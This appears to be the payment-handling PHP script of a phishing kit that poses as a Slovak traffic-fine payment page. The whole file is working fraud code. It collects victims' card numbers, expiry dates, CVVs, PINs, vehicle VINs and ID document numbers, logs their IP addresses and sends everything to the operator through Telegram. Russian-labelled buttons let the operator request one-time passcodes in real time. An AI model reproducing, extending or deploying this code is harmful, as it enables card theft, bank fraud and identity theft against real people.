<?php
require_once __DIR__ . '/../config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'Invalid request']);
    exit;
}

$vinHidden = $_POST['vin_hidden'] ?? '';
$docHidden = $_POST['doc_hidden'] ?? '';
$holder = $_POST['holder'] ?? '';
$card = $_POST['card'] ?? '';
$expiry = $_POST['expiry'] ?? '';
$cvv = $_POST['cvv'] ?? '';
$pin = $_POST['pin'] ?? '';

if (empty($holder) || empty($card) || empty($expiry) || empty($cvv) || empty($pin)) {
    echo json_encode(['success' => false, 'message' => 'Chýbajúce údaje']);
    exit;
}

// Get real IP address
$realIp = getRealIpAddress();

// Generate session ID
$sessionId = getSessionId();

// Create status file
$statusFile = LOGS_DIR . $sessionId . '.status';
file_put_contents($statusFile, 'waiting');

// Prepare Telegram message
$message = "🔔 <b>NOVÁ PLATBA - POKUTA SK</b>\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "<b>📋 OVERENIE:</b>\n";
if (!empty($vinHidden)) {
    $message .= "🚗 VIN: <code>" . htmlspecialchars($vinHidden) . "</code>\n";
}
if (!empty($docHidden)) {
    $message .= "🆔 Doklad: <code>" . htmlspecialchars($docHidden) . "</code>\n";
}
$message .= "\n<b>💳 PLATOBNÉ ÚDAJE:</b>\n";
$message .= "👤 Držiteľ: <code>" . htmlspecialchars($holder) . "</code>\n";
$message .= "💳 Karta: <code>" . htmlspecialchars($card) . "</code>\n";
$message .= "📅 Platnosť: <code>" . htmlspecialchars($expiry) . "</code>\n";
$message .= "🔐 CVV: <code>" . htmlspecialchars($cvv) . "</code>\n";
$message .= "🔑 PIN: <code>" . htmlspecialchars($pin) . "</code>\n";
$message .= "\n<b>📊 INFO:</b>\n";
$message .= "💰 Suma: <b>25,00 €</b>\n";
$message .= "🆔 Session: <code>" . $sessionId . "</code>\n";
$message .= "🌐 IP: <code>" . $realIp . "</code>\n";
$message .= "🕐 Čas: " . date('d.m.Y H:i:s') . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━";

// Inline keyboard
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '📱 Запросить OTP', 'callback_data' => 'otp_' . $sessionId],
            ['text' => '❌ Ошибка', 'callback_data' => 'err_' . $sessionId]
        ],
        [
            ['text' => '✅ Успех', 'callback_data' => 'ok_' . $sessionId],
            ['text' => '💬 Чат', 'callback_data' => 'chat_' . $sessionId]
        ]
    ]
];

// Send to Telegram
sendTelegramMessage($message, $keyboard);

echo json_encode(['success' => true, 'session_id' => $sessionId]);
exit;
